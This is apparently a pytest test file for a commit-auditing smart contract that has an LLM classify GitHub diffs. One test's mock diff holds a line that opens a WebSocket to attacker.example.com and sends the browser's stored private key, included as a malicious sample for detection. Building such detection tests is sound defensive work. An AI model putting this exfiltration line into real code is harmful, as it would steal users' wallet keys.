"""Direct-mode tests for DiffSentinel.

These exercise the contract logic in-memory without a running network.
They mock the GitHub compare API and the LLM inside `gl.nondet` blocks,
verify state transitions, fee flow, access control, and validator
consensus behaviour.
"""

import json
from pathlib import Path

import pytest


def _hex(addr) -> str:
    if isinstance(addr, (bytes, bytearray)):
        return "0x" + bytes(addr).hex()
    s = str(addr)
    return s if s.startswith("0x") else "0x" + s


CONTRACT_PATH = str(
    Path(__file__).resolve().parent.parent.parent / "contracts" / "diff_sentinel.py"
)


def _mock_compare(direct_vm, *, files, status=200, url_re=r".*api\.github\.com/repos/.*/compare/.*"):
    payload = {"files": files}
    direct_vm.mock_web(
        url_re,
        {"status": status, "body": json.dumps(payload)},
    )


def _mock_llm(direct_vm, verdict):
    direct_vm.mock_llm(
        r".*decentralized software supply chain auditor.*",
        json.dumps(
            {
                "classification": verdict,
                "reasoning": f"Test verdict was {verdict}.",
                "red_flags": "" if verdict == "CLEAN" else "test_flag",
            }
        ),
    )


def _deploy(direct_deploy, direct_vm, direct_owner, fee_recipient_hex="", fee_bps=100):
    direct_vm.sender = direct_owner
    return direct_deploy(CONTRACT_PATH, fee_recipient_hex, fee_bps)


def test_initial_state(direct_vm, direct_deploy, direct_owner):
    contract = _deploy(direct_deploy, direct_vm, direct_owner)
    assert contract.owner_address().lower() == _hex(direct_owner).lower()
    cfg = contract.fee_config()
    assert cfg["fee_bps"] == 100
    assert cfg["recipient"].lower() == _hex(direct_owner).lower()
    assert cfg["total_fees_paid_out_wei"] == "0"
    stats = contract.stats()
    assert stats == {"clean": 0, "suspicious": 0, "malicious": 0, "total": 0}
    assert contract.ledger_size() == 0


def test_fee_bps_bounds(direct_vm, direct_deploy, direct_owner):
    direct_vm.sender = direct_owner
    with direct_vm.expect_revert("fee_bps must be <= 10000"):
        direct_deploy(CONTRACT_PATH, "", 10001)


def test_verify_clean_commit(direct_vm, direct_deploy, direct_owner, direct_alice):
    contract = _deploy(direct_deploy, direct_vm, direct_owner)
    _mock_compare(
        direct_vm,
        files=[
            {"filename": "src/lib.py", "patch": "@@ -1,2 +1,3 @@\n+def add(a, b):\n+    return a + b"}
        ],
    )
    _mock_llm(direct_vm, "CLEAN")

    direct_vm.sender = direct_alice
    direct_vm.value = 10**18  # 1 GEN
    contract.verify_commit(
        "acme/lib",
        "aaaaaaa1",
        "bbbbbbb1",
        "Add addition helper.",
    )

    assert contract.has_verdict("acme/lib", "bbbbbbb1") is True
    v = contract.get_verdict("acme/lib", "bbbbbbb1")
    assert v["classification"] == "CLEAN"
    assert v["submitted_by"].lower() == _hex(direct_alice).lower()
    assert contract.get_repo_status("acme/lib") == "bbbbbbb1"
    stats = contract.stats()
    assert stats["clean"] == 1
    assert stats["total"] == 1
    # Fee = 1% of 1 GEN = 10^16 wei
    assert contract.fee_config()["total_fees_paid_out_wei"] == "10000000000000000"


def test_verify_malicious_commit_updates_counters(
    direct_vm, direct_deploy, direct_owner, direct_alice
):
    contract = _deploy(direct_deploy, direct_vm, direct_owner)
    _mock_compare(
        direct_vm,
        files=[
            {
                "filename": "src/wallet.js",
                "patch": (
                    "@@ +1,4 @@\n"
                    "+const ws=new WebSocket('wss://attacker.example.com');\n"
                    "+ws.send(localStorage.getItem('privateKey'));"
                ),
            }
        ],
    )
    _mock_llm(direct_vm, "MALICIOUS")
    direct_vm.sender = direct_alice
    direct_vm.value = 0
    contract.verify_commit("acme/wallet", "c001", "d002", "Minor cleanup.")

    v = contract.get_verdict("acme/wallet", "d002")
    assert v["classification"] == "MALICIOUS"
    assert contract.get_repo_status("acme/wallet") == ""  # never CLEAN
    stats = contract.stats()
    assert stats["malicious"] == 1
    assert stats["clean"] == 0


def test_duplicate_verdict_rejected(direct_vm, direct_deploy, direct_owner, direct_alice):
    contract = _deploy(direct_deploy, direct_vm, direct_owner)
    _mock_compare(direct_vm, files=[{"filename": "a.py", "patch": "+print('hi')"}])
    _mock_llm(direct_vm, "CLEAN")
    direct_vm.sender = direct_alice
    contract.verify_commit("a/b", "111", "222", "cl")

    with direct_vm.expect_revert("already verified"):
        contract.verify_commit("a/b", "111", "222", "cl")


def test_recent_verdicts_returns_newest_first(
    direct_vm, direct_deploy, direct_owner, direct_alice
):
    contract = _deploy(direct_deploy, direct_vm, direct_owner)
    _mock_compare(direct_vm, files=[{"filename": "a.py", "patch": "+x=1"}])
    direct_vm.sender = direct_alice

    _mock_llm(direct_vm, "CLEAN")
    contract.verify_commit("a/b", "111", "222", "one")

    direct_vm.clear_mocks()
    _mock_compare(direct_vm, files=[{"filename": "a.py", "patch": "+x=2"}])
    _mock_llm(direct_vm, "SUSPICIOUS")
    contract.verify_commit("a/b", "222", "333", "two")

    recent = contract.recent_verdicts(10)
    assert len(recent) == 2
    assert recent[0]["target_commit"] == "333"
    assert recent[1]["target_commit"] == "222"


def test_only_owner_can_update_fee_config(
    direct_vm, direct_deploy, direct_owner, direct_alice, direct_bob
):
    contract = _deploy(direct_deploy, direct_vm, direct_owner)

    direct_vm.sender = direct_alice
    with direct_vm.expect_revert("only owner"):
        contract.set_fee_config("", 50)

    direct_vm.sender = direct_owner
    contract.set_fee_config(_hex(direct_bob), 250)
    cfg = contract.fee_config()
    assert cfg["fee_bps"] == 250
    assert cfg["recipient"].lower() == _hex(direct_bob).lower()


def test_rejects_bad_input(direct_vm, direct_deploy, direct_owner, direct_alice):
    contract = _deploy(direct_deploy, direct_vm, direct_owner)
    direct_vm.sender = direct_alice
    with direct_vm.expect_revert("repo must be owner/name"):
        contract.verify_commit("badrepo", "a", "b", "cl")
    with direct_vm.expect_revert("missing commit sha"):
        contract.verify_commit("acme/x", "", "b", "cl")
    with direct_vm.expect_revert("base and target identical"):
        contract.verify_commit("acme/x", "a", "a", "cl")


def test_github_404_bubbles_up(direct_vm, direct_deploy, direct_owner, direct_alice):
    contract = _deploy(direct_deploy, direct_vm, direct_owner)
    direct_vm.mock_web(
        r".*api\.github\.com/.*",
        {"status": 404, "body": '{"message":"not found"}'},
    )
    direct_vm.sender = direct_alice
    with direct_vm.expect_revert("compare not found"):
        contract.verify_commit("acme/missing", "a", "b", "cl")


def test_llm_returns_alias_normalized_to_clean(
    direct_vm, direct_deploy, direct_owner, direct_alice
):
    contract = _deploy(direct_deploy, direct_vm, direct_owner)
    _mock_compare(direct_vm, files=[{"filename": "a.py", "patch": "+x=1"}])
    direct_vm.mock_llm(
        r".*decentralized software supply chain auditor.*",
        json.dumps({"classification": "safe", "reasoning": "fine", "red_flags": ""}),
    )
    direct_vm.sender = direct_alice
    contract.verify_commit("a/b", "111", "222", "cl")
    assert contract.get_verdict("a/b", "222")["classification"] == "CLEAN"


def test_validator_agrees_when_classification_matches(
    direct_vm, direct_deploy, direct_owner, direct_alice
):
    contract = _deploy(direct_deploy, direct_vm, direct_owner)
    _mock_compare(direct_vm, files=[{"filename": "a.py", "patch": "+x=1"}])
    _mock_llm(direct_vm, "CLEAN")
    direct_vm.sender = direct_alice
    contract.verify_commit("a/b", "111", "222", "cl")
    # Validator runs the same leader_fn with the same mocks — same classification.
    assert direct_vm.run_validator() is True


def test_validator_disagrees_when_classification_differs(
    direct_vm, direct_deploy, direct_owner, direct_alice
):
    contract = _deploy(direct_deploy, direct_vm, direct_owner)
    _mock_compare(direct_vm, files=[{"filename": "a.py", "patch": "+x=1"}])
    _mock_llm(direct_vm, "CLEAN")
    direct_vm.sender = direct_alice
    contract.verify_commit("a/b", "111", "222", "cl")

    # Swap the LLM mock so validator sees a different verdict.
    direct_vm.clear_mocks()
    _mock_compare(direct_vm, files=[{"filename": "a.py", "patch": "+x=1"}])
    _mock_llm(direct_vm, "MALICIOUS")
    assert direct_vm.run_validator() is False
